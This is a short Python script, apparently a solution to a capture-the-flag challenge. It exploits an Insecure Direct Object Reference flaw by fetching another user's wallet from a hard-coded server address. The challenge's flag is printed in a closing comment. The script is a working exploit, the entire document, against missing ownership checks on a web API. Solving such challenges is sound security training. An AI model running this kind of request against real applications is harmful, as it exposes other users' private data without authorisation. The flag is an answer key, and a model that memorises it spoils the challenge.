import requests


base_url="http://68.219.177.187:8000/"

""" 
    We are currently authenticated as alice user (You can find this by visiting /api/debug) 
    target user: bob with id: b61696efec46c36f and wallet id: fe9b1a2e5af5a7dd
    since the application doesn't check if the wallet you are visiting belongs to you or not,
    we can visit bob's wallet. This vulnerability is called Insecure Direct Object Reference (IDOR)
"""

r=requests.get(base_url+"api/wallet/fe9b1a2e5af5a7dd")
print(r.json()['FLAG'])

#The flag: SecurinetsENIT{01c1ff55c322453ab1e016bf7dbc6537}